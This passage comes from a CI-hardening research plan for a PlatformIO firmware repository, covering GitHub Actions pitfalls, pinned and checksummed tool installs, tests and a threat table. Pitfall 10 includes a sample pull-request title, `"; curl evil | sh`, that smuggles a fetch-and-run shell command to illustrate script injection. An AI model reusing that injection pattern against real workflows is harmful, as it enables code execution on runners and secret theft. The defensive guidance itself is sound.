- **A second path-filter action.** It would disagree with `affected.py` about shared paths
  and silently drop a build that the mapper would have widened.
- **Requiring a matrix job's check name.** Matrix entries produce distinct names, and GitHub
  matches required checks literally.
- **`always()` on `gate`.** It also runs after cancellation; `!cancelled()` is the correct
  scope.
- **Referencing `secrets.*` in a job-level `if`.** The `secrets` context is not available
  there; map the secret to a job-level `env` and test it at step level.
- **Interpolating `github.event.*` into `run:`.** A pull-request title or a branch name is
  contributor-controlled; pass it through `env:` and quote it.

## Don't Hand-Roll

| Problem | Don't build | Use instead | Why |
|---------|-------------|-------------|-----|
| Diff → affected projects | A new glob/filter script | `scripts/affected.py` | It already owns the fanout table, `NO_BUILD_IMPACT`, the `..`/absolute-path guard and the fail-safe widening; all are tested. |
| Aggregate job results | A bespoke status API call | `toJSON(needs)` + allowlist | The `needs` context already carries every dependency's `result`. |
| Toolchain caching | A manual tarball cache | `actions/cache` | Key/restore semantics, 10 GB cap and eviction are handled. |
| Secret scanning | A grep | gitleaks 8.30.1 (pinned) | Entropy/rule-based, already configured and pinned; the pre-commit hook covers staged files. |
| Lint/schema/drift | Individual CI commands | `pre-commit run --all-files` | One pinned surface, byte-identical locally and in CI; a second invocation list would drift. |
| Empty-matrix guarding | A synthetic noop matrix entry | Job-level `if` on the matrix output | The guard is evaluated before matrix expansion; a noop entry would build nothing but still consume a check name. |
| Evidence upload | Writing files into the repository | `actions/upload-artifact` | Retention, deduplication and access control are handled by GitHub. |

**Key insight:** every hard part of this phase already has a tested owner in the repository.
The phase's job is wiring and failure semantics, not new logic.

## Common Pitfalls

### Pitfall 1: The required check name is the job's `name`, not its id
**What goes wrong:** The ruleset is configured with a name the job never reports, so the check
stays `Pending` and every merge is blocked.
**Why it happens:** GitHub matches required status checks by the job's display name; for a
workflow check the name format is `<job name>`. `[CITED: docs.github.com/.../troubleshooting-rules]`
**How to avoid:** Job id `gate` **and** `name: gate`; assert the literal string in
`scripts/tests/test_ci_workflows.py`; change the ruleset in the same PR as any rename.
**Warning signs:** The PR shows `gate` green in the Actions tab but "Waiting for status to be
reported" in the merge box.

### Pitfall 2: `needs.<job>.result` has no `timed_out` value
**What goes wrong:** A gate written as `result == 'timed_out'` never matches; a timed-out
dependency is reported as `failure` or `cancelled`.
**Why it happens:** The documented vocabulary is exactly `success`, `failure`, `cancelled`,
`skipped`. `[CITED: docs.github.com/en/actions/reference/workflows-and-actions/contexts]`
**How to avoid:** Allowlist `success` and `skipped`, and fail on everything else (Pattern 1).
**Warning signs:** A timed-out `build` is silently treated as success.

### Pitfall 3: The pre-commit gitleaks hook scans nothing in CI
**What goes wrong:** `meta` looks like it scans secrets because the hook is listed, but on a
clean checkout nothing is staged.
**Why it happens:** The hook's entry is `gitleaks git --pre-commit --redact --staged
--verbose`; `--staged` reads the index, and a CI checkout has an empty index.
`[VERIFIED: .pre-commit-config.yaml:15]`
**How to avoid:** Keep the D-14 step, `gitleaks git --redact --verbose --log-opts="--all"`,
with `fetch-depth: 0`.
**Warning signs:** The hook passes in one second and a known planted secret in history is
never reported.

### Pitfall 4: An empty matrix fails before the job-level `if` can save it
**What goes wrong:** `Matrix vector does not contain any values`, and the whole run is red on
a documentation-only PR.
**Why it happens:** A matrix with no entries is invalid; the guard must be on the job, not on
a step, because matrix expansion precedes step execution.
`[CITED: https://github.com/dorny/paths-filter/issues/66]`
**How to avoid:** `if: ${{ needs.changes.outputs.build != '' && needs.changes.outputs.build != '[]' }}`;
make the producer always emit `[]`.
**Warning signs:** A docs-only PR fails at job setup with zero steps executed.

### Pitfall 5: Pretty-printed JSON breaks `$GITHUB_OUTPUT`
**What goes wrong:** The mapper's default output spans many lines; a `printf 'build=%s\n'`
writes a multi-line value and the step output is truncated or the file parse fails.
**Why it happens:** `_render` uses `json.dumps(payload, indent=2)`.
`[VERIFIED: scripts/affected.py:497]`
**How to avoid:** `jq -c .build` / `jq -c .simulate` before writing the output, or use the
heredoc output form.
**Warning signs:** `fromJson` receives an empty string.

### Pitfall 6: `hashFiles('platformio.ini')` hashes nothing at the root
**What goes wrong:** The cache key never changes when a project's `platformio.ini` changes,
or (if someone "fixes" it with `**/platformio.ini`) it changes on every project edit and
fragments the 10 GB cache.
**Why it happens:** `hashFiles` is relative to `GITHUB_WORKSPACE`; there is no root
`platformio.ini`, and the project files live at `homeworks/*/platformio.ini`.
`[CITED: docs.github.com/en/actions/reference/workflows-and-actions/expressions]`
**How to avoid:** Key on `hashFiles('platformio.shared.ini')` only — that file holds the
platform and framework pins. `[VERIFIED: platformio.shared.ini:5]` (`platform = espressif32@8.0.0`)
**Warning signs:** An espressif32 bump does not invalidate the toolchain cache.

### Pitfall 7: PR caches do not warm other PRs
**What goes wrong:** Every pull request is cold even though the previous PR cached 1.5 GB of
toolchain.
**Why it happens:** A cache is scoped to the ref that created it; pull-request runs can
restore the default branch and the base branch, but not another PR's cache.
`[CITED: docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching]`
**How to avoid:** Cache the toolchain in `nightly.yml` too, so the default branch seeds the
cache every PR restores.
**Warning signs:** Warm PR runs are as slow as the first one.

### Pitfall 8: `pre-commit run --all-files` does not run clang-tidy
**What goes wrong:** CI is believed to cover clang-tidy, but only the pre-commit stage runs.
**Why it happens:** The two clang-tidy hooks declare `stages: [pre-push]`.
`[VERIFIED: .pre-commit-config.yaml:239,261]`
**How to avoid:** A separate `static-analysis` job that generates the native database and
runs `pre-commit run --all-files --hook-stage pre-push` (verified locally: it runs exactly
`clang-tidy compilation database present` and `clang-tidy`, both `Passed`).
**Warning signs:** A clang-tidy regression passes CI.

### Pitfall 9: `pre-commit install-hooks` installs every stage
**What goes wrong:** The fast `meta` job downloads the clang-tidy environment it never uses.
**Why it happens:** `install-hooks` takes only `-c`/`--color`, and its `--help` output lists
no stage filter `[VERIFIED: pre-commit install-hooks --help output]`; that it therefore
installs every hook environment is `[ASSUMED]` (A9).
**How to avoid:** Accept the one-time download and share one cache key between `meta` and
`static-analysis`, or skip `install-hooks` and let `run` install only what it executes (a
deviation from D-13).
**Warning signs:** `meta` cold time dominated by a clang-tidy download.

### Pitfall 10: Script injection through a pull-request title or a matrix value
**What goes wrong:** A title such as `feat(x): "; curl evil | sh` executes in the runner.
**Why it happens:** `${{ github.event.pull_request.title }}` is contributor-controlled, and
so are project and environment names (they come from the contributor's tree).
`[CITED: docs.github.com/.../security-hardening-for-github-actions]`
**How to avoid:** Pass every such value through `env:` and use quoted shell variables
(`"$PR_TITLE"`, `"$PROJECT"`, `"$ENV_NAME"`); never interpolate directly into `run:`.
**Warning signs:** A `run:` block containing `${{ github.event... }}` or `${{ matrix.* }}`
outside `env:`.

### Pitfall 11: Secrets are not available to fork pull requests
**What goes wrong:** A fork PR's simulation step fails with an empty token, or a
`pull_request_target` workaround is introduced to "fix" it.
**Why it happens:** "With the exception of GITHUB_TOKEN, secrets are not passed to the runner
when a workflow is triggered from a forked repository."
`[CITED: docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions]`
**How to avoid:** the job-level head-repo equality test, plus a step-level token check for a
same-repo PR whose secret is unset; never use `pull_request_target`.
**Warning signs:** A `pull_request_target` trigger appears in the workflow.

### Pitfall 12: The official Wokwi action downloads `latest` and cannot tee stdout
**What goes wrong:** The CLI version drifts, and the "full scenario stdout" artifact D-10
requires is never written.
**Why it happens:** `wokwi-ci-action@v1.3.0` runs
`wget .../releases/latest/download/wokwi-cli-linuxstatic-x64` and pipes the CLI output to the
step log only. `[VERIFIED: wokwi-ci-action v1.3.0 action.yml]`
**How to avoid:** Install the pinned 0.28.1 binary with the recorded SHA-256 and run it
directly, teeing to a file (Pattern 4).
**Warning signs:** An artifact upload with `if-no-files-found: warn` and no stdout file.

### Pitfall 13: Simulation cannot reuse the build job's firmware
**What goes wrong:** The scenario starts against a missing image.
**Why it happens:** `wokwi.toml` points at `.pio/build/esp32s3_arduino/firmware.merged.bin`,
and no build job uploads it. `[VERIFIED: homeworks/1_3-police-flasher/wokwi.toml:3-4]`
**How to avoid:** `simulate` runs `pio run -d "$PROJECT" -e "$ENV_NAME"` immediately before
the scenario, using the matrix environment.
**Warning signs:** "firmware not found" or a scenario that exits before the first serial byte.

### Pitfall 14: `workflow_dispatch` has no pull-request context
**What goes wrong:** `github.base_ref` is empty, `github.event.pull_request.title` is null,
and the head-repo guard compares null.
**Why it happens:** These contexts exist only for `pull_request` events.
**How to avoid:** `${BASE_REF:-main}`, `if: github.event_name == 'pull_request'` on the title
step, and the job-level guard naturally skipping `simulate` on dispatch.
**Warning signs:** `git diff origin/...HEAD` with an empty ref.

### Pitfall 15: A title edit does not re-run the check
**What goes wrong:** A non-conventional title is edited after the last push, `gate` stays
green, and the squash commit publishes the new title.
**Why it happens:** `pull_request` defaults to `opened`, `synchronize`, `reopened`; `edited`
is not included.
**How to avoid:** Add `edited` to `pull_request.types` (a full matrix re-run on a title edit)
or accept the gap and document it; see Open Question 2.
**Warning signs:** A merged commit whose subject violates Conventional Commits despite a
green `gate`.

### Pitfall 16: `ubuntu-latest` is about to change
**What goes wrong:** The image changes under the workflow, and a tool version or path moves.
**Why it happens:** The runner-images announcement says `ubuntu-latest` will use Ubuntu 26.04
in November 2026. `[VERIFIED: actions/runner-images Ubuntu2404-Readme.md announcement]`
**How to avoid:** Keep `ubuntu-24.04` everywhere, as the existing workflows do.
**Warning signs:** An unrelated tool failure immediately after a runner-image rollout.

### Pitfall 17: The workflow count and the drift-command assertions break
**What goes wrong:** `scripts/tests/test_ci_workflows.py` fails after the workflow files
change.
**Why it happens:** It asserts exactly four workflows and asserts the drift command in
`generated-views.yml`, which is deleted. `[VERIFIED: scripts/tests/test_ci_workflows.py:119]`
and `[VERIFIED: scripts/tests/test_ci_workflows.py:90]`
**How to avoid:** Update the count to three (`ci.yml`, `nightly.yml`, `docs.yml`) and move the
drift assertion to the hook surface (`gen-views-check` in `.pre-commit-config.yaml`) or to the
`pre-commit run --all-files` command in `ci.yml`.
**Warning signs:** A red `python-tests` job immediately after deleting the workflows.

### Pitfall 18: `python-tests` fails on a runner without `uv`
**What goes wrong:** Tests raise `uv is a required repository tool; install it before running
this suite`.
**Why it happens:** The suite shells out to `uv run` in several files, and the Ubuntu 24.04
runner image's software list names no `uv`. `[VERIFIED: scripts/tests/test_affected.py:33-36]`
`[ASSUMED: the runner image omits `uv` — an absence in its software list, not a declared
exclusion]`
**How to avoid:** `python -m pip install uv==0.13.5` before the suite; optionally cache
`~/.cache/uv`.
**Warning signs:** Many test errors, all naming `uv`.

### Pitfall 19: `docs.yml`'s comment becomes false
**What goes wrong:** The workflow still says pull requests run `generated-views`.
**Why it happens:** The comment predates the retirement. `[VERIFIED: .github/workflows/docs.yml:3-7]`
**How to avoid:** Update the comment in the same PR that deletes `generated-views.yml`.
**Warning signs:** `AGENTS.md` and `docs.yml` disagree with `.github/workflows/`.

### Pitfall 20: Deleting `security.yml` removes the post-merge scan of `main`
**What goes wrong:** A secret that only exists in the squash commit message or the PR body is
never scanned after merge.
**Why it happens:** `security.yml` runs on `push: branches: [main]`
`[VERIFIED: .github/workflows/security.yml:3-7]`; `meta` runs on pull requests only, and the
squash commit is created after the PR has finished.
**How to avoid:** Add a full-history gitleaks step to `nightly.yml` (recommended), see Open
Question 1.
**Warning signs:** No workflow ever runs on `main` after a merge.

### Pitfall 21: A cancelled superseded run leaves a cancelled required check
**What goes wrong:** Pushing twice quickly cancels the first run; the PR briefly shows a
cancelled `gate`.
**Why it happens:** `concurrency.cancel-in-progress: true`, the established pattern.
**How to avoid:** Accept it — the newer run reports a fresh `gate`; do not disable
cancellation, which would queue stale runs.
**Warning signs:** Flicker in the merge box, not a permanent block.

## Code Examples

Verified patterns from the repository and official sources:

### `pio run` vs `pio test -e native`

```bash
# D-6: the environment name, not the framework, selects the command.
if [ "$ENV_NAME" = "native" ]; then
  pio test -d "$PROJECT" -e "$ENV_NAME"
else
  pio run -d "$PROJECT" -e "$ENV_NAME"
fi
```

The mapper emits `framework: "native"` and `env: "native"` for the native entries
`[VERIFIED: scripts/affected.py:469-481]`; the documented contract is "reached with
`pio test -e native`, never with `pio run -e native`"
`[VERIFIED: homeworks/1_3-police-flasher/platformio.ini:25]`.

### Full-history gitleaks, copied from `security.yml`

```yaml
      - name: Install gitleaks
        env:
          GITLEAKS_VERSION: 8.30.1
          GITLEAKS_SHA256: 551f6fc83ea457d62a0d98237cbad105af8d557003051f41f3e7ca7b3f2470eb
        run: |
          set -euo pipefail
          archive="$RUNNER_TEMP/gitleaks.tar.gz"
          release="https://github.com/gitleaks/gitleaks/releases/download"
          release="${release}/v${GITLEAKS_VERSION}"
          curl --proto '=https' --tlsv1.2 -sSfL \
            "${release}/gitleaks_${GITLEAKS_VERSION}_linux_x64.tar.gz" \
            -o "$archive"
          echo "${GITLEAKS_SHA256}  ${archive}" | sha256sum -c -
          tar -xzf "$archive" -C "$RUNNER_TEMP" gitleaks
          install -m 0755 "$RUNNER_TEMP/gitleaks" /usr/local/bin/gitleaks
      - name: Scan full history
        run: gitleaks git --redact --verbose --log-opts="--all"
```

`[VERIFIED: .github/workflows/security.yml:22-45]`

### `wokwi-cli` install with a recorded digest

```bash
set -euo pipefail
version=0.28.1
sha256=869f194ee473257c6112ed58d786376527769020056320b0a49a37d9e7d3bdd7
archive="$RUNNER_TEMP/wokwi-cli-linuxstatic-x64"
curl --proto '=https' --tlsv1.2 -sSfL \
  "https://github.com/wokwi/wokwi-cli/releases/download/v${version}/wokwi-cli-linuxstatic-x64" \
  -o "$archive"
echo "${sha256}  ${archive}" | sha256sum -c -
install -m 0755 "$archive" /usr/local/bin/wokwi-cli
```

### Diagram lint over every homework

```bash
set -euo pipefail
found=0
for diagram in homeworks/*/assets/diagram.json; do
  [ -e "$diagram" ] || continue
  found=1
  wokwi-cli lint --offline "$diagram"
done
[ "$found" -eq 1 ] || echo "no diagrams to lint"
```

Verified locally: `wokwi-cli lint --offline homeworks/1_3-police-flasher/assets/diagram.json`
exits `0` with one informational `unsupported-part` note.

### Host static analysis

```bash
pio run -d tests -e native -t compiledb
pre-commit run --all-files --hook-stage pre-push
```

Verified locally: the database target reports `SUCCESS`; `scripts/clang-tidy-db` prints
`PASS clang-tidy-db: .../tests/compile_commands.json is fresher than 13 input(s)`; the
pre-push run executes exactly the two clang-tidy hooks, both `Passed`.

### Python suite

```bash
python3 -m unittest discover scripts/tests
```

Verified locally: `Ran 380 tests in 37.834s` — `OK`.

### Local full gate

```bash
pre-commit run --all-files --show-diff-on-failure
```

Verified locally: all 13 hooks pass, including `homework metadata contract`,
`shared-library dependency rule` and `generated views are in sync`.

## State of the Art

| Old approach | Current approach | When changed | Impact |
|--------------|------------------|--------------|--------|
| `homework.yml` builds one hard-coded project | `affected.py` matrix builds only changed projects | Phase 8 | CI time scales with the change, not the repository. |
| `generated-views.yml` runs the drift check | `gen-views-check` inside the `meta` hook run | Phase 8 | One policy surface; the workflow count drops. |
| `security.yml` scans full history on PR **and** `push` to `main` | `meta` scans PR history | Phase 8 | Post-merge coverage must be restored in nightly (Open Question 1). |
| No PR-time site build or Python suite (WR-13) | `docs-build` + `python-tests` jobs | Phase 8 | The PR gate now proves the two things the phase gate proved locally. |
| No aggregate check | Single literal `gate` | Phase 8 | The ruleset requires one stable name instead of a growing list. |
| Simulation deferred after the spike | Opt-in `simulate` job with evidence artifacts | Phase 8 | Simulation is possible without blocking forks or exhausting quota. |
| `ubuntu-latest` implied by habit | `ubuntu-24.04` pinned | Existing practice | Insulates the phase from the November 2026 `latest` move. |

**Deprecated/outdated:**
- `.github/workflows/homework.yml`, `.github/workflows/generated-views.yml`,
  `.github/workflows/security.yml` — retired by D-1.
- `policy/repository.json` / `scripts/check_policy.py` referenced by ADR-0011 — no longer
  exist (ceremony trim); rulesets are UI-owned. Do not reintroduce a policy checker.
- `test_ci_workflows.py::test_generated_views_names_the_check_command` — points at a file
  that will no longer exist.

## Assumptions Log

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | The repository owner will create the `WOKWI_CLI_TOKEN` secret and a `simulate` label before the first labelled run. | Simulation policy | The `simulate` job fails its step-level token check; PRs still merge (it is opt-in). |
| A2 | `wokwi-cli --serial-log-file` accepts an absolute path under `$RUNNER_TEMP`. | Code Examples | The serial log lands elsewhere; the artifact is incomplete. Confirm on the first run. |
| A3 | The first green `ci.yml` run makes `gate` selectable in the ruleset (7-day rule). | Human checkpoint | The owner cannot add the required check until a run succeeds. |
| A4 | `actions/upload-artifact@v7` accepts a directory path with `retention-days: 7`. | Simulation policy | Upload fails; evidence is lost but the gate still reflects the run status. |
| A5 | The toolchain cache stays under the 10 GB repository cap with one key per shared-ini hash. | Caching | Eviction of the cache; runs get slower, nothing breaks. |
| A6 | A title edit after the last push is acceptable to validate on the next push (unless `edited` is added). | Pitfall 15 | A non-conventional squash subject can be published. |
| A7 | The repository is small enough that a full-history gitleaks scan fits comfortably in `meta`. | Meta surface | `meta` slows down; the 15-minute timeout is generous. |
| A8 | The `ubuntu-24.04` runner image provides neither `uv`, `pre-commit`, nor `wokwi-cli`; the plan must install all three explicitly. | Standard Stack, Pitfall 18, Environment Availability | Installing an already-present tool is harmless; the reverse (assuming presence) would fail the job. |
| A9 | `pre-commit install-hooks` installs every hook environment in the config, including the pre-push ones, because it exposes no stage filter. | Pitfall 9 | `meta`'s cold time may be higher than expected; the shared cache still makes it a one-time cost. |

## Open Questions

1. **Post-merge secret scanning after `security.yml` retires**
   - What we know: `security.yml` currently scans on `push: branches: [main]`; `meta` scans
     only pull-request refs, and the squash commit (PR title + body) is created after the PR
     finishes.
   - What's unclear: whether the owner considers the PR-time scan sufficient for INV-01.
   - Recommendation: add a `gitleaks` job to `nightly.yml` (full history, `fetch-depth: 0`).
     It needs no new workflow, keeps D-1 intact, and bounds the exposure window to one day.
     A `push: main` trigger is the alternative but would run the full matrix on every merge.

2. **Re-validating an edited pull-request title**
   - What we know: the title becomes the squash subject (ADR-0011: `PR_TITLE` + `PR_BODY`).
   - What's unclear: whether a full matrix re-run on a title edit is acceptable.
   - Recommendation: add `edited` to `pull_request.types` and accept the rare extra run; a
     second title-only workflow would contradict D-1's one-PR-workflow topology.

3. **Where clang-tidy runs**
   - What we know: D-17 requires it, D-13 excludes it from the pre-commit stage, and it needs
     a PlatformIO native compile database.
   - What's unclear: the context names no job for it.
   - Recommendation: a separate `static-analysis` job (timeout 20) in `gate.needs`, so `meta`
     stays fast.

4. **Check-name spelling for the ruleset**
   - What we know: GitHub matches required checks by display name.
   - Recommendation: job id `gate` with `name: gate`, asserted literally by the workflow
     test; the human checkpoint adds exactly `gate`.

5. **Should `docs-build` / `python-tests` be path-filtered?**
   - What we know: D-15 makes them parallel, not conditional; each adds seconds to every PR.
   - Recommendation: do not filter. A second path dialect would repeat D-3's objection, and
     the jobs are parallel so they only matter if they are the slowest.

6. **wokwi-cli digest provenance**
   - What we know: the release publishes no checksum file.
   - Recommendation: commit the observed SHA-256 in a ledger (KaTeX precedent) and note it is
     an observed value; do not download `latest`.

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|-------------|-----------|---------|----------|
| `uv` | `changes`, `python-tests`, `nightly` | ✗ on the runner (assumed) | — | `python -m pip install uv==0.13.5`; locally ✓ 0.13.5 |
| Python 3.13 | every Python job | ✓ via `setup-python` | 3.13 | runner default is 3.12.3, so always use `setup-python` |
| PlatformIO Core | `build`, `simulate`, `static-analysis` | ✓ via pip | 6.2.0 | — |
| `pre-commit` | `meta`, `static-analysis` | ✗ on the runner (assumed) | — | `python -m pip install pre-commit==4.7.0` |
| `jq` | `changes`, `gate`, `simulate` | ✓ preinstalled | 1.7 | Python one-liner, but jq is present |
| `wokwi-cli` | `meta` (lint), `simulate` | ✗ on the runner (assumed) | — | pinned 0.28.1 binary + recorded digest; locally ✓ 0.28.1 |
| `mkdocs` | `docs-build` | ✗ locally | — | `python -m pip install -r requirements-docs.txt` in the job |
| `git` | checkout, diff, gitleaks | ✓ | 2.54.0 local / runner-provided | — |
| `gh` | manual verification only | ✓ locally | 2.103.0 | — |
| `wokwi-cli` token | `simulate` | ✗ | — | human checkpoint: repository secret `WOKWI_CLI_TOKEN` |

**Missing dependencies with no fallback:**
- `WOKWI_CLI_TOKEN` — without it the opt-in simulation cannot execute; this is a human
  checkpoint, and the job fails closed rather than silently skipping.

**Missing dependencies with fallback:**
- `uv`, `pre-commit`, `mkdocs`, `wokwi-cli`, PlatformIO — all installed by pinned commands
  inside the job.

## Validation Architecture

### Test Framework

| Property | Value |
|----------|-------|
| Framework | Python stdlib `unittest` (no third-party test runner) |
| Config file | none — discovery from `scripts/tests` |
| Quick run command | `python3 -m unittest discover scripts/tests` |
| Full suite command | `python3 -m unittest discover scripts/tests` (380 tests, 38 s locally) |

### Phase Requirements → Test Map

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| TOOL-05 | `meta` runs the hook surface, gitleaks full history, `wokwi-cli lint`, and the title check; `changes` emits both matrices | text contract | `python3 -m unittest scripts.tests.test_ci_workflows -v` | ✓ extend `scripts/tests/test_ci_workflows.py` |
| TOOL-05 | `affected.py` maps a diff (including widen-all and no-build-impact) | behavioral | `python3 -m unittest scripts.tests.test_affected -v` | ✓ existing |
| TOOL-06 | `gate` is literal, `needs` every PR job, and allows only `success`/`skipped` | text contract | `python3 -m unittest scripts.tests.test_ci_workflows -v` | ✓ extend |
| TOOL-06 | `pio run` vs `pio test -e native` split and the native test suite | behavioral (CI only) | CI `build` matrix; local `pio test -d tests -e native` | ✓ existing commands |
| TOOL-06 | Nightly runs the full matrix, no simulation | text contract | `python3 -m unittest scripts.tests.test_ci_workflows -v` | ✓ extend |
| SIM-04 | Same-repo + label guard, step-level token check, timeout, artifact upload, no status flip | text contract | `python3 -m unittest scripts.tests.test_ci_workflows -v` | ✓ extend |
| SIM-04 | The documented Wokwi command resolves its paths | behavioral | `python3 -m unittest scripts.tests.test_simulation_paths -v` (skips if `wokwi-cli` is absent) | ✓ existing |

### Sampling Rate

- **Per task commit:** `python3 -m unittest discover scripts/tests`
- **Per wave merge:** the same suite plus `pre-commit run --all-files --show-diff-on-failure`
- **Phase gate:** the suite green, `pre-commit` green, and one live `ci.yml` run green before
  the ruleset checkpoint.

### Wave 0 Gaps

- [ ] Extend `scripts/tests/test_ci_workflows.py`: three workflows, literal `gate`,
      `needs` coverage, `if: ${{ !cancelled() }}`, gitleaks command, `wokwi-cli lint`,
      `uv run scripts/affected.py --base`, the empty-matrix guard, the simulate guard and
      artifact upload, and the nightly widen-all invocation.
- [ ] Move the `gen-views-check` assertion from the deleted `generated-views.yml` to
      `.pre-commit-config.yaml` (hook id) and/or the `pre-commit run --all-files` command in
      `ci.yml`.
- [ ] Add a text assertion that `nightly.yml` has no simulation reference.
- [ ] No framework install is needed (stdlib `unittest`).

## Security Domain

`workflow.security_enforcement: true`, `security_asvs_level: 1`,
`security_block_on: high`.

### Applicable ASVS Categories

| ASVS Category | Applies | Standard Control |
|---------------|---------|-----------------|
| V2 Authentication | no | — |
| V3 Session Management | no | — |
| V4 Access Control | yes | `permissions: contents: read`; same-repo + label guard for the token-bearing job; no `pull_request_target` |
| V5 Input Validation | yes | PR title validated with a bash regex; matrix values passed through `env:` and quoted; `affected.py` rejects absolute and `..` paths |
| V6 Cryptography | yes | SHA-256 verification of the gitleaks archive and the wokwi binary; never hand-rolled |
| V7 Error Handling | yes | `set -euo pipefail`; `PIPESTATUS[0]`; fail-closed checksum verification |
| V8 Data Protection | yes | no secret in a `run:` line, a file, or a log; `--redact` on gitleaks |
| V14 Configuration | yes | actions pinned by commit SHA; `ubuntu-24.04` pinned; tool versions pinned |

### Known Threat Patterns for GitHub Actions + PlatformIO

| Pattern | STRIDE | Standard Mitigation |
|---------|--------|---------------------|
| Script injection via `github.event.pull_request.title` | Tampering / Elevation | Intermediate `env:` variable and quoted expansion |
| Script injection via matrix `project`/`env` values | Tampering / Elevation | `env:` + `"$PROJECT"` / `"$ENV_NAME"`; never interpolate `${{ matrix.* }}` into `run:` |
| Secret exfiltration from a fork PR | Information Disclosure | Fork PRs receive no secrets; same-repo guard; no `pull_request_target` |
| Secret exposure to a same-repo collaborator's branch | Information Disclosure | Maintainer-applied `simulate` label is the control; ephemeral runners; read-only token |
| Compromised action tag | Tampering | Pin every action by commit SHA (existing practice) |
| Compromised binary download | Tampering | `sha256sum -c` with a committed digest |
| Malicious contributor script in a `system` pre-commit hook | Elevation | Expected: ephemeral runner, read-only token, no secret in `meta` |
| Cache poisoning | Tampering | Keyed on the reviewed pin files; no broad `restore-keys`; caches are not writable across forks |

## Sources

### Primary (HIGH confidence)

- `scripts/affected.py` — lines 48-54 (JSON contract), 96-119 (`NO_BUILD_IMPACT` /
  `WIDEN_ALL`), 469-481 (`build`/`simulate` construction). Read this session.
- `.pre-commit-config.yaml` — line 1 (`minimum_pre_commit_version: '4.7.0'`), line 15
  (gitleaks `--staged` entry), lines 147/170/198 (architecture, metadata, drift entries),
  lines 239/261 (`stages: [pre-push]`). Read this session.
- `.github/workflows/docs.yml`, `.github/workflows/security.yml`,
  `.github/workflows/generated-views.yml`, `.github/workflows/homework.yml` — pins, commands
  and trigger surfaces. Read this session.
- `scripts/tests/test_ci_workflows.py` — line 90 (drift command), line 119 (four-workflow
  assertion). Read this session.
- `scripts/clang-tidy-db` — lines 52-60 (`DATABASE`, `CONFIG_INPUTS`, `ANALYSER_SOURCES`).
  Read this session.
- `platformio.shared.ini` — line 5 (`platform = espressif32@8.0.0`), line 35
  (`platform = native`). Read this session.
- `homeworks/1_3-police-flasher/wokwi.toml` — lines 3-4 (firmware/elf paths). Read this
  session.
- `AGENTS.md` — lines 21-24 (quick-start), 33 and 155 (`security.yml` claims), 245 (routing
  table). Read this session.
- Commands executed in this working tree: `pre-commit run --all-files --show-diff-on-failure`
  (13 hooks, all passed); `pre-commit run --all-files --hook-stage pre-push` (2 hooks);
  `python3 -m unittest discover scripts/tests` (380 tests, OK);
  `uv run scripts/affected.py --base origin/main` (`{"build": [], "simulate": []}`);
  `uv run scripts/affected.py --paths-from` with `platformio.shared.ini` (all projects);
  `pio run -d tests -e native -t compiledb` (SUCCESS);
  `python3 scripts/clang-tidy-db` (PASS); `wokwi-cli lint --offline` (exit 0).

### Secondary (MEDIUM confidence)

- `https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/troubleshooting-required-status-checks`
  — the seven-day selectability rule, skipped checks reporting Success, pending checks
  blocking merges.
- `https://docs.github.com/en/actions/reference/workflows-and-actions/contexts` — `needs`
  result vocabulary.
- `https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions`
  — secrets absent on fork pull requests.
- `https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching`
  — key/restore semantics, 10 GB cap, 7-day eviction, branch scoping.
- `https://docs.github.com/en/actions/reference/workflows-and-actions/expressions` —
  `hashFiles` semantics.
- `https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax` —
  `timeout-minutes` cancels the job.
- `https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions`
  — intermediate environment variables against script injection.
- `https://jakewharton.com/fan-in-to-a-single-required-github-action/` — the fan-in pattern.
- `https://github.com/dorny/paths-filter/issues/66` — the empty-matrix job-level `if`.
- `https://github.com/wokwi/wokwi-ci-action` `action.yml` at `v1.3.0` — inputs and the
  unpinned `latest` download.
- `https://docs.platformio.org/en/latest/integration/ci/github-actions.html` — cache paths and
  the `pio run` / `pio test` split.
- `https://docs.wokwi.com/wokwi-ci/getting-started` — free-plan 50 minutes, 5-minute session
  cap, simulated-time metering.

### Tertiary (LOW confidence)

- `https://latchkey.dev/learn/github-actions/gha-fromjson-matrix-not-array` — corroborates the
  `if`-before-matrix-expansion behaviour; treated as secondary support only.
- The `wokwi-cli` SHA-256 is an observed digest, not a vendor-published checksum.

## Metadata

**Confidence breakdown:**

- Standard stack: HIGH — every version and SHA was read in the repository or resolved with
  `git ls-remote`; no new dependency is introduced.
- Architecture: HIGH for the in-repo contracts and command behaviour; MEDIUM for the GitHub
  job-graph semantics, which are documented but not exercised here.
- Pitfalls: HIGH for the repository-specific ones (hook stages, gitleaks `--staged`, the
  workflow test, `uv` absence, `wokwi` action behaviour); MEDIUM for the platform ones
  (required-check matching, cache scoping, matrix guard) because they rest on documentation.
- Simulation: MEDIUM — the 15 s upper bound and the CLI command are verified, but the CI
  invocation (absolute serial-log path, artifact completeness) has never run.

**Research date:** 2026-10-26
**Valid until:** 2026-11-25 (30 days) for the repository contracts; 7 days for the GitHub
platform claims, which move faster (notably the `ubuntu-latest` → 26.04 rollout in November
2026 and action releases).
